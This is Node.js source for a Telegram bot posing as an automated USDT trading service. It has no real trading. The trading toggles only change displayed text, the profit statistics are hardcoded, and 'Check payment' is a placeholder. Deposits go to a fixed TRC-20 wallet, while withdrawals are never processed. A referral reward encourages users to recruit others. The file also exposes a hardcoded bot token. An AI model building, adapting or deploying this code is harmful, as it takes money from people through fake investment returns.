const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const moment = require('moment');
const http = require('http');
const token = '6363609133:AAGokjYGa80BOoeG2ItLOiEA6_TYaFEKc60'; // Remplacez par votre token de bot
const adminChatId = '5873712733'; // Remplacez par l'ID de chat de l'administrateur
const bot = new TelegramBot(token, { polling: true });

// Fonctions d'aide
const getUserData = async (chatId) => {
  try {
    const response = await axios.get('https://solkah.org/id/data.txt');
    const data = response.data.split('\n').filter(Boolean);
    const user = data.find(line => line.startsWith(`${chatId}:`));
    if (!user) {
      return null;
    }
    const [id, balance, withdrawal, registrationDate] = user.split(':');
    return { id, balance, withdrawal, registrationDate };
  } catch (error) {
    console.error('Error fetching user data:', error);
    return null;
  }
};

const setUserData = async (chatId, balance, withdrawal, registrationDate) => {
  try {
    console.log(`Sending data to chat.php: id=${chatId}, balance=${balance}, withdrawal=${withdrawal}, registrationDate=${registrationDate}`);
    const response = await axios.post('https://solkah.org/id/chat.php', {
      id: chatId,
      balance,
      withdrawal,
      registrationDate
    });
    console.log('Response from chat.php:', response.data);
  } catch (error) {
    console.error('Error setting user data:', error);
  }
};

const initializeUser = async (chatId) => {
  const user = await getUserData(chatId);
  if (!user) {
    const registrationDate = moment().format('YYYY-MM-DD');
    await setUserData(chatId, 0.00, 0, registrationDate);
  }
};

// Commandes du bot
bot.onText(/\/start/, async (msg) => {
  const chatId = msg.chat.id;
  await initializeUser(chatId); // Initialisation de l'utilisateur et envoi des données au serveur
  const welcomeMessage = `Great! All is ready for start.

Before using our service, we strongly recommend you to carefully review the functionality of each trading bot button.

Menu:

"Trading" - here you can see the results of the bot's trading for different periods of time.
You can also pause or resume the trading bot;
"Stop trading/Start trading" - starting and stopping the trading bot;
"Trading Bot statistics" - bot trading statistics for the period: 24 hours, 3 days, 7 days, 1 month, 3 months;
"Trading Bot Channel" - up-to-date information on bot trading.

"My account" - up-to-date information on the balance and account. Deposit/withdrawal of funds, referral system;
"Top up your balance" - the ability to replenish the USDT TRC20 wallet to get started (10% commission);
"Withdrawal of funds" - the ability to withdraw USDT TRC20 to your wallet (10% commission);
"Balance history" - deposits and withdrawals on your trading account;
"Referral system" - the reward is 5% from each deposit of the listed users.`;

  const keyboard = {
    reply_markup: {
      keyboard: [
        [{ text: 'Trading💰' }, { text: 'My account' }],
        [{ text: 'Deposit' }, { text: 'Withdrawal' }],
        [{ text: 'Support' }]
      ],
      resize_keyboard: true,
      one_time_keyboard: false
    }
  };

  bot.sendMessage(chatId, welcomeMessage, keyboard);
});

bot.on('message', async (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text;

  if (text === 'Trading💰') {
    const tradingMessage = `Trading 
"Stop trading / Start trading" - starting and stopping the trading bot.
"Trading bot statistics" - bot trading statistics for the period: 24 hours, 3 days, 7 days, 1 month, 3 months.

Trading status: Stopped 🚫`;

    const inlineKeyboard = {
      reply_markup: {
        inline_keyboard: [
          [{ text: 'Start trading', callback_data: 'start_trading' }],
          [{ text: 'Stop trading', callback_data: 'stop_trading' }],
          [{ text: 'Statistics', callback_data: 'statistics' }],
          [{ text: 'Trading Bot Channel', url: 'https://t.me/+BaZqzAd4Mus5NzU0' }]
        ]
      }
    };

    bot.sendMessage(chatId, tradingMessage, inlineKeyboard);
  } else if (text === 'My account') {
    const userData = await getUserData(chatId);
    if (userData) {
      const accountMessage = `💰 Current balance: ${userData.balance} USDT
📅 Date of registration: ${userData.registrationDate}
💸 Total withdrawal: ${userData.withdrawal} USDT

🔗 Your referral link: https://t.me/@Orrdoxbot?start=${chatId}`;

      const inlineKeyboard = {
        reply_markup: {
          inline_keyboard: [
            [{ text: 'Deposit', callback_data: 'deposit' }]
          ]
        }
      };

      bot.sendMessage(chatId, accountMessage, inlineKeyboard);
    } else {
      bot.sendMessage(chatId, 'No user data found.');
    }
  } else if (text === 'Deposit') {
    const depositMessage = `❗️ In order to top up your balance, you need to transfer USDT to a wallet below (the commission for replenishment is 10%). 
The transfer is realized automatically.

❗️ The minimum amount for replenishment is 20 USDT
➖➖➖➖➖
Wallet address USDT TRC-20:
\`TDpKzxmecCqdwUU8DoTjvjoKwUnemh7sge\`
(To copy, click on the wallet👆)`;

    const inlineKeyboard = {
      reply_markup: {
        inline_keyboard: [
          [{ text: 'Check payment', callback_data: 'check_payment' }]
        ]
      }
    };

    // Envoi d'un message à l'administrateur lorsque l'utilisateur clique sur "check"
    const adminMessage = `New deposit: ${chatId}`;
    bot.sendMessage(adminChatId, adminMessage); // Envoi d'un message à l'administrateur

    bot.sendMessage(chatId, depositMessage, inlineKeyboard);
  } else if (text === 'Withdrawal') {
    bot.sendMessage(chatId, 'The minimum withdrawal is 25 USDT');
  } else if (text === 'Support') {
    bot.sendMessage(chatId, 'You are now connected to support. Please describe your issue.');
    bot.on('message', (msg) => {
      if (msg.chat.id !== chatId) return; // Ignore messages from other chats
      bot.sendMessage(adminChatId, `Support request from ${msg.chat.username || msg.chat.first_name} (${chatId}):\n${msg.text}`, {
        reply_markup: {
          inline_keyboard: [
            [{ text: 'Reply', callback_data: `reply_${chatId}` }]
          ]
        }
      });
    });
  }
});

bot.on('callback_query', async (callbackQuery) => {
  const message = callbackQuery.message;
  const chatId = message.chat.id;
  const data = callbackQuery.data;

  if (data.startsWith('reply_')) {
    const userId = data.split('_')[1];
    bot.sendMessage(chatId, 'Please type your reply:');
    bot.on('message', (msg) => {
      if (msg.chat.id !== chatId) return; // Ignore messages from other chats
      bot.sendMessage(userId, `Support reply:\n${msg.text}`);
    });
  } else if (data === 'start_trading') {
    const tradingMessage = `Stop trading / Start trading" - starting and stopping the trading bot.
"Trading bot statistics" - bot trading statistics for the period: 24 hours, 3 days, 7 days, 1 month, 3 months.

Trading status: ACTIVE ✅️`;

    const inlineKeyboard = {
      reply_markup: {
        inline_keyboard: [
          [{ text: 'Stop trading', callback_data: 'stop_trading' }],
          [{ text: 'Statistics', callback_data: 'statistics' }],
          [{ text: 'Trading Bot Channel', url: 'https://t.me/+BaZqzAd4Mus5NzU0' }]
        ]
      }
    };

    bot.editMessageText(tradingMessage, { chat_id: chatId, message_id: message.message_id, reply_markup: inlineKeyboard.reply_markup });
  } else if (data === 'stop_trading') {
    const tradingMessage = `Stop trading / Start trading" - starting and stopping the trading bot.
"Trading bot statistics" - bot trading statistics for the period: 24 hours, 3 days, 7 days, 1 month, 3 months.

Trading status: Stopped 🚫`;

    const inlineKeyboard = {
      reply_markup: {
        inline_keyboard: [
          [{ text: 'Start trading', callback_data: 'start_trading' }],
          [{ text: 'Statistics', callback_data: 'statistics' }],
          [{ text: 'Trading Bot Channel', url: 'https://t.me/+BaZqzAd4Mus5NzU0' }]
        ]
      }
    };

    bot.editMessageText(tradingMessage, { chat_id: chatId, message_id: message.message_id, reply_markup: inlineKeyboard.reply_markup });
  } else if (data === 'statistics') {
    bot.sendMessage(chatId, 'Trading Bot Statistics:\n24 hours: 5%\n3 days: 10%\n7 days: 15%');
  } else if (data === 'deposit') {
    const depositMessage = `❗️ In order to top up your balance, you need to transfer USDT to a wallet below (the commission for replenishment is 10%). 
The transfer is realized automatically.

❗️ The minimum amount for replenishment is 20 USDT
➖➖➖➖➖
Wallet address USDT TRC-20:
\`TDpKzxmecCqdwUU8DoTjvjoKwUnemh7sge\`
(To copy, click on the wallet👆)`;

    const inlineKeyboard = {
      reply_markup: {
        inline_keyboard: [
          [{ text: 'Check payment', callback_data: 'check_payment' }]
        ]
      }
    };

    bot.sendMessage(chatId, depositMessage, inlineKeyboard);
  } else if (data === 'check_payment') {
    bot.sendMessage(chatId, 'Payment checked!'); // Placeholder message for payment check
    // Envoi d'un message à l'administrateur lorsque l'utilisateur clique sur "check"
    const adminMessage = `New deposit: ${chatId}`;
    bot.sendMessage(adminChatId, adminMessage); // Envoi d'un message à l'administrateur
  }
});

// Créez un serveur HTTP simple qui renvoie "I'm alive" lorsque vous accédez à son URL
const server = http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.write("I'm alive");
    res.end();
});

// Écoutez le port 8080
server.listen(8080, () => {
    console.log("Keep alive server is running on port 8080");
});
